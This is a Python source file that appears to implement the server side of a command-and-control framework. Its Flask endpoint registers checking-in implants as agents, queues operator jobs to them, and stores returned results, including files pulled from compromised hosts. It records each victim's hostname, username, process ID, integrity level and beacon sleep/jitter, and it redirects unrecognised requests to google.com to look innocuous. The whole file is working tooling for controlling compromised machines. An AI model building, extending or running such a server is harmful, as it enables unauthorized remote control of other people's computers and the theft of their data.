import datetime
import json
import os

from connect.server.models import db, StagerModel, AgentModel, JobModel, ImplantModel
from connect.generate import digit_identifier, string_identifier
from connect.output import print_traceback, error
from connect.convert import base64_to_string, base64_to_bytes, string_to_base64
from flask_socketio import emit, disconnect, SocketIO
from flask import Blueprint, request, jsonify, redirect

check_in = Blueprint('check_in', __name__)
key = digit_identifier()
websocket = SocketIO(max_http_buffer_size=1e10)


def _commit(models: list):
    """
    Commits model object changes to the database.

    :param models: A list of models.
    """
    for model in models:
        db.session.add(model)
    db.session.commit()


def _retrieve_results(job_list):
    """
    What job are we working with?
    Does the job have results? If so, record those based on the following types:
    Don't emit results < 0 < Emit results
    (2, -2) = Byte results, sets job results to be the name of the file the byte stream is saved to.
    (1, -1) = Textual results, sets job results to the raw data.

    :param job_list:
    :return:
    """
    job = JobModel.query.filter_by(identifier=job_list[0]).first()
    agent = job.agent
    if not len(job_list) > 1:
        return
    results = f'Unknown job type {job.type} for {job.name} from {agent.name}'
    if job.type == 1 or job.type == -1:
        results = base64_to_string(job_list[1])
        websocket.emit('job_results', f'{{"banner":"{job.name.title()} job results from {agent.name}:",'
                                      f'"results":"{job_list[1]}"}}')
    if job.type == 2 or job.type == -2:
        results = base64_to_bytes(job_list[1])
        file = f'{os.getcwd()}/connect/server/downloads/{string_identifier()}'
        with open(file, 'wb') as fd:
            fd.write(results)
        websocket.emit('job_results', f'{{"banner":"Wrote {job.name.title()} job results from {agent.name} to:",'
                                      f'"results":"{string_to_base64(file)}"}}')
        return
    if 'Job Failed:' in results:
        job.completed = datetime.datetime.now()
        job.results = results
        _commit([agent, job])
        return
    if job.name == 'hostname':
        agent.hostname = results
    if job.name == 'whoami':
        agent.username = results
    if job.name == 'pid':
        agent.pid = results
    if job.name == 'integrity':
        agent.integrity = results
    if job.name == 'set sleep':
        _tmp = results.split()
        agent.sleep = _tmp[3]
    if job.name == 'set jitter':
        _tmp = results.split()
        agent.jitter = _tmp[3]
    job.completed = datetime.datetime.now()
    job.results = results
    _commit([agent, job])


def _connected_notification(agent):
    time_delta = (datetime.datetime.now() - agent.check_in)
    max_delay = (float(agent.sleep) * (float(agent.jitter) / 100)) + float(agent.sleep)
    if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in or \
            time_delta.total_seconds() > (max_delay + 10.0):
        websocket.emit('connected', f'{agent.name} is connected', broadcast=False)
    agent.check_in = datetime.datetime.now()
    _commit([agent])


def _retrieve_unsent_jobs(job):
    """
    If the job is a check_in then we need to grab uncompleted jobs for the agent.

    :param job_list:
    :return:
    """
    _unsent_jobs = []
    agent = job.agent
    _connected_notification(agent)
    for unsent_job in agent.jobs:
        if unsent_job.sent:
            continue
        websocket.emit('job_sent', f'Sent job {unsent_job.name.title()} to {agent.name}')
        unsent_job.sent = datetime.datetime.now()
        _commit([unsent_job])
        _unsent_jobs.append({"id": str(unsent_job.identifier), "name": unsent_job.name,
                             "arguments": unsent_job.arguments})
    return _unsent_jobs


@check_in.route('/<path:uri>', methods=['GET', 'POST'])
def endpoint(uri):
    """
    The check_in endpoint for agents.

    :param uri: The URI requested.
    """
    try:
        jobs_req = request.get_json(force=True)
    except Exception as e:
        error(f'Failed to parse jobs_req: {request.get_data()} {uri} : {e}')
        return redirect("http://www.google.com")

    unsent_jobs = []
    for job_list in jobs_req:
        try:
            # Is this an implant checking in?
            # If so, create an agent and send it a check_in job.
            implants = ImplantModel.query.all()
            for implant in implants:
                if not job_list[0] == implant.key:
                    continue
                agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
                check_in_job = JobModel(name='check_in', agent=agent, type=-1)
                check_in_job.completed = datetime.datetime.now()
                check_in_job.sent = datetime.datetime.now()
                _commit([agent, check_in_job])
                return jsonify({"job_rep": [{"id": str(check_in_job.identifier), "name": check_in_job.name,
                                             "arguments": check_in_job.arguments}]})

            job = JobModel.query.filter_by(identifier=job_list[0]).first()
            if not job:
                return redirect("http://www.google.com")
            _retrieve_results(job_list)
            if not job.name == 'check_in':
                continue
            unsent_jobs.extend(_retrieve_unsent_jobs(job))
        except Exception:
            print_traceback()
    return jsonify({"job_rep": unsent_jobs})


def connect(auth):
    """
    This event is triggered on client connection requests.
    If the authentication data does not match the generated key,
    then a disconnect event is triggered.

    :param auth:
    """
    if not auth == key:
        disconnect()


def agents():
    """
    This event emits all current agents within the database to the client.
    """
    _agents = [agent.get_agent() for agent in AgentModel.query.all()]
    emit('agents', {'agents': _agents}, broadcast=False)


def stagers():
    """
    This event emits all current stagers within the database to the client.
    """
    _stagers = [stager.get_stager() for stager in StagerModel.query.all()]
    emit('stagers', {'stagers': _stagers, 'server_uri': request.host_url}, broadcast=False)


def new_job(data):
    """
    This event schedules a new job to be sent to the agent.
    The *data* excpeted is {'name':'', 'agent_name':'', 'arguments':'', type:''}

    :param data:
    """
    data = json.loads(data)
    agent = AgentModel.query.filter_by(name=data['agent_name']).first()
    job = JobModel(name=data['name'], agent=agent, arguments=data['arguments'], type=data['type'])
    db.session.add(job)
    db.session.commit()
